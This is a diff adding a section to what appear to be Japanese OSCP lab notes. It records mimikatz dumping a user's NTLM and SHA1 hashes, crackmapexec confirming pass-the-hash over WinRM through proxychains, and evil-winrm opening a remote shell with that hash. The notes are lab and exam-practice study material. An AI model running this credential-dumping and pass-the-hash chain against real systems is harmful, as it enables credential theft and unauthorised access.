@@ -716,3 +716,58 @@ Microsoft Windows [Version 10.0.19044.2251]
 C:\Windows\system32>C:\wamp64\attendance\images\mimikatz.exe
 C:\wamp64\attendance\images\mimikatz.exe
 ```
+
+### evil-winrm
+mimikatz の NTLM から shell を取る
+
+```
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 397322 (00000000:0006100a)
+Session           : Interactive from 1
+User Name         : celia.almeda
+Domain            : OSCP
+Logon Server      : DC01
+Logon Time        : 3/30/2024 12:35:35 AM
+SID               : S-1-5-21-2610934713-1581164095-2706428072-1105
+	msv :	
+	 [00000003] Primary
+	 * Username : celia.almeda
+	 * Domain   : OSCP
+	 * NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd
+	 * SHA1     : 8cb61017910862af238631bf7aaae38df64998cd
+	 * DPAPI    : f3ad0317c20e905dd62889dd51e7c52f
+
+```
+crackmapexec で調査
+```
+└─$ proxychains crackmapexec winrm 10.10.174.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd -d oscp.exam 
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5986 <--socket error or timeout!
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
+HTTP        10.10.174.142   5985   10.10.174.142    [*] http://10.10.174.142:5985/wsman
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
+WINRM       10.10.174.142   5985   10.10.174.142    [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
+```
+evil-winrm で shell 取得
+```
+┌──(rnozaka㉿rnozaka)-[~/Documents/OSCP_A]
+└─$ proxychains evil-winrm -i 10.10.174.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.174.142:5985  ...  OK
+*Evil-WinRM* PS C:\Users\celia.almeda\Documents> whoami
+oscp\celia.almeda
+```
